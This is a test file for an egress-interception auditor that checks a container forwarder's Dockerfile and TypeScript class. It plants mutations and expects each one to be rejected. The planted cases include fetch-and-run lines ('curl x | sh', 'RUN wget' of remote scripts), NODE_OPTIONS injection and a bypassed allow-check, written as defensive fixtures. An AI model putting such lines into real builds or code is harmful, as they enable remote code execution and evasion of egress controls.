// Planted reds for gate:egress-interception's forwarder admission: the live CodexEgress passes, and each mutation of
// one proof keeps a container in the interception set.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { CONTAINER_IMAGES, imageReference, readSource, sourceHash } from './container-images';
import { auditForwarder, forwarderCallerReasons, ownerValueReasons, publicMethods, type ForwarderInputs } from './egress-interception';

const REPO = join(import.meta.dir, '..');

const FILE = 'packages/cf-backend/src/egress/codex-egress.ts';

const IMAGE = CONTAINER_IMAGES.CodexEgress;

const DOCKERFILE = `${IMAGE.source}/Dockerfile`;

function live(): ForwarderInputs {
  return {
    owner: 'CodexEgress',
    file: FILE,
    fileText: readFileSync(join(REPO, FILE), 'utf8'),
    image: IMAGE,
    boundImage: imageReference(IMAGE),
    sourceFiles: readSource(REPO, IMAGE.source),
  };
}

/** The live inputs with one source file rewritten and its hash recorded, so only the proof under test fails. */
function withFile(path: string, rewrite: (text: string) => string): ForwarderInputs {
  const files = new Map(live().sourceFiles);
  files.set(path, rewrite(String(files.get(path) ?? '')));

  return { ...live(), sourceFiles: files, image: { ...IMAGE, sourceHash: sourceHash(files) } };
}

describe('a direct Container is admitted only with all three proofs', () => {
  test('the live CodexEgress is admitted', () => {
    expect(auditForwarder(live())).toEqual([]);
  });

  test('(a) no record, a moved source, or a different bound image keeps it in the set', () => {
    expect(auditForwarder({ ...live(), image: undefined })).toHaveLength(1);

    const moved = new Map(live().sourceFiles);
    moved.set(`${IMAGE.source}/server.mjs`, `${String(moved.get(`${IMAGE.source}/server.mjs`))}\n// edited after the push\n`);
    expect(auditForwarder({ ...live(), sourceFiles: moved }).join('\n')).toContain('no longer hashes');

    expect(auditForwarder({ ...live(), boundImage: `${IMAGE.repository}@sha256:${'0'.repeat(64)}` }).join('\n')).toContain('is bound to');
  });

  test('(b) anything but FROM, COPY, WORKDIR, ENV, EXPOSE, USER, LABEL and CMD, or a foreign program, keeps it in the set', () => {
    const cases: ReadonlyArray<readonly [string, (text: string) => string]> = [
      ['uses `RUN`', (text) => text.replace('USER node', 'RUN wget https://example.com/agent.js\nUSER node')],
      ['uses `ENTRYPOINT`', (text) => text.replace(/^CMD /mu, 'ENTRYPOINT ["sh", "-c", "$CODE"]\nCMD ')],
      ['uses `ONBUILD`', (text) => text.replace('USER node', 'ONBUILD RUN wget https://example.com/agent.js\nUSER node')],
      ['uses `ADD`', (text) => text.replace('COPY server.mjs .', 'ADD https://example.com/agent.js .\nCOPY server.mjs .')],
      ['uses `RUN`', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs \\\n  .\nLABEL a=b \\\nRUN=1\nRUN \\\n  wget https://example.com/x')],
      ['not a tracked file', (text) => text.replace('COPY server.mjs .', 'COPY server.mjs \\\n  agent.js .')],
      ['not a pinned digest', (text) => text.replace(/^FROM .*$/mu, 'FROM node:22-alpine')],
      ['not one tracked script', (text) => text.replace(/^CMD .*$/mu, 'CMD ["node", "-e", "require(process.env.CODE)"]')],
      ['sets a NODE_ variable', (text) => text.replace('USER node', 'ENV NODE_OPTIONS=--import=data:text/javascript,x\nUSER node')],
      ['names CMD twice', (text) => `${text}CMD ["node", "server.mjs"]\n`],
    ];

    for (const [reason, rewrite] of cases) {
      const rewritten = withFile(DOCKERFILE, rewrite);

      expect({ reason, changed: rewritten.sourceFiles.get(DOCKERFILE) !== live().sourceFiles.get(DOCKERFILE) }).toEqual({ reason, changed: true });
      expect({ reason, found: auditForwarder(rewritten).join('\n').includes(reason) }).toEqual({ reason, found: true });
    }
  });

  test('(c) any way to the container but a guarded containerFetch keeps it in the set', () => {
    const text = live().fileText;
    const guard = 'if (!codexEgressAllowed({ method: request.method, url: request.url })) {';
    const cancel = '  cancel(callId: string): void {';
    const member = (added: string): string => text.replace(cancel, `${added}\n\n${cancel}`);

    const cases: ReadonlyArray<readonly [string, string]> = [
      ['touches `this.exec`', member('  async run(command: string) { return this.exec(command); }')],
      ['touches `this.start`', member("  async boot() { await this.start({ entrypoint: ['sh', '-c', 'curl x | sh'] }); }")],
      ['declares `entrypoint`', text.replace('  sleepAfter = ', "  entrypoint = ['sh', '-c', 'curl x | sh'];\n\n  sleepAfter = ")],
      ['declares `envVars`', text.replace('  sleepAfter = ', "  envVars = { NODE_OPTIONS: '--import=x' };\n\n  sleepAfter = ")],
      ['overrides `start`', member('  override async start() { return super.start(); }')],
      ['touches `this.fetch`', member('  async pass(request: Request) { return this.fetch(request); }')],
      ['reads a computed member', member("  async pass(request: Request) { return this['containerFetch'](request); }")],
      ['other than by calling it directly', member('  async pass(request: Request) { const send = this.containerFetch.bind(this); return send(request); }')],
      ['lets `this` escape', text.replace('export class CodexEgress', 'function drive(box: CodexEgress) { return box; }\n\nexport class CodexEgress').replace(cancel, `  leak() { return drive(this); }\n\n${cancel}`)],
      ['no top-level', text.replace(guard, "const check = () => { if (!codexEgressAllowed({ method: request.method, url: request.url })) throw new KinuError('denied', 'x'); };\n    if (false) {")],
      ['no top-level', text.replace(guard, "if (!codexEgressAllowed({ method: 'GET', url: 'https://chatgpt.com/backend-api/codex/models' })) {")],
      ['no top-level', text.replace('        method: request.method,', '        method: other.method,').replace('async forward(ownerUserId: string, callId: string, request: Request)', 'async forward(ownerUserId: string, callId: string, request: Request, other: Request)')],
      ['no top-level', text.replace(guard, 'if (!request.url) {')],
      ['no top-level', text.replace("import { codexEgressAllowed, EgressCalls } from '@kinu.run/core';", "import { EgressCalls } from '@kinu.run/core';\nconst codexEgressAllowed = (_: unknown): boolean => true;")],
      ['non-arrow function', member('  async pass(request: Request) { const self = this; return (function () { return self; })(); }')],
      ['carries a decorator', text.replace('export class CodexEgress', '@withRun\nexport class CodexEgress')],
      ['carries a decorator', text.replace(cancel, `  @boot\n${cancel}`)],
      ['is used as a value', `${text}\nCodexEgress.prototype.run = function run() { return 1; };\n`],
      ['is used as a value', `${text}\nObject.assign(CodexEgress.prototype, { run() { return 1; } });\n`],
      ['no top-level', text.replace("    const headers = new Headers(request.headers);", "    request = new Request('https://chatgpt.com/backend-api/codex/responses', { method: 'POST' });\n    const headers = new Headers(request.headers);")],
    ];

    for (const [reason, fileText] of cases) {
      expect({ reason, changed: fileText !== text }).toEqual({ reason, changed: true });
      expect({ reason, found: auditForwarder({ ...live(), fileText }).join('\n').includes(reason) }).toEqual({ reason, found: true });
    }
  });

  test('every reach for the binding goes through the route, to the class\'s own methods', () => {
    const route = 'packages/cf-backend/src/egress/codex-egress-route.ts';
    const routeText = readFileSync(join(REPO, route), 'utf8');
    const methods = new Set(publicMethods('CodexEgress', FILE, live().fileText));
    const clean = new Map([[FILE, live().fileText], [route, routeText]]);

    expect([...methods].sort()).toEqual(['cancel', 'forward']);
    expect(forwarderCallerReasons('CodexEgress', methods, clean)).toEqual([]);
    expect(ownerValueReasons('CodexEgress', new Map([[route, routeText]]))).toEqual([]);

    const planted: ReadonlyArray<readonly [string, string, string]> = [
      ['not one of its own methods', route, routeText.replace('stub.cancel(callId)', "stub.start({ entrypoint: ['sh'] })")],
      ['other than through its route', 'packages/cf-backend/src/boot.ts', "import type { CodexEgress } from './egress/codex-egress';\nexport const boot = (env: Env) => env.CodexEgress.get(env.CodexEgress.idFromName('u')).start();\n"],
      ['destructures', 'packages/cf-backend/src/boot.ts', "import type { CodexEgress } from './egress/codex-egress';\nexport const boot = ({ CodexEgress: ns }: Env) => ns;\n"],
    ];

    for (const [reason, path, text] of planted) {
      const found = forwarderCallerReasons('CodexEgress', methods, new Map([...clean, [path, text]])).join('\n');

      expect({ reason, found: found.includes(reason) }).toEqual({ reason, found: true });
    }
  });
});
